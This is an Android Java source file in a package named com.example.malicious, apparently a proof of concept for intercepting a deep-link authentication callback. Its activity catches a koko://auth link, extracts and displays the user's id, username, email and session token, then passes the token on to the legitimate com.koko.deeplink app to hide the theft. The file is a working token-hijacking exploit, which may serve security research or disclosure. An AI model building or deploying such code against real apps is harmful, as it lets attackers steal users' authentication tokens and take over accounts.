package com.example.malicious;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        // The format of the response
        // koko://auth?action=register&token=db238d20285954403ae0e60c263eb33cbb658af6fbc9ec461b373aba7a0ad691
        // &user={"id":"0","username":"test","email":"test@test.test","token":"db238d20285954403ae0e60c263eb33cbb658af6fbc9ec461b373aba7a0ad691"}

        Uri uri = getIntent().getData();
        String[] user = uri.getQueryParameter("user").split("\"");

        String id = user[3];
        String username = user[7];
        String email = user[11];
        String token = uri.getQueryParameter("token");

        TextView ID_tv = findViewById(R.id.ID);
        TextView username_tv = findViewById(R.id.username);
        TextView email_tv = findViewById(R.id.email);
        TextView token_tv = findViewById(R.id.token);

        ID_tv.setText(id);
        username_tv.setText(username);
        email_tv.setText(email);
        token_tv.setText(token);

        Intent intent = new Intent();
        intent.setClassName("com.koko.deeplink", "com.koko.deeplink.AuthCallbackActivity");
        intent.setData(Uri.parse("koko://auth?token=" + token));
        startActivity(intent);
    }
}